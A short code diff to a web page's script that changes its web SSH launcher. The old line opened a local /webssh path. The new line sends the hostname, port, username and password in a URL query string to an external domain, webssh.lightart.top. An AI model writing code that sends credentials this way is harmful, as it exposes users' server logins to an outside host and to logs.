@@ -130,7 +130,7 @@
                 let username = $('#sshUser').val();
                 let password = $('#realPwd').val();
 
-                window.open(`/webssh?hostname=${hostname}&port=${port}&username=${username}&password=${password}`);
+                window.open(`https://webssh.lightart.top/?hostname=${hostname}&port=${port}&username=${username}&password=${password}`);
             }
         </script>
     </div>
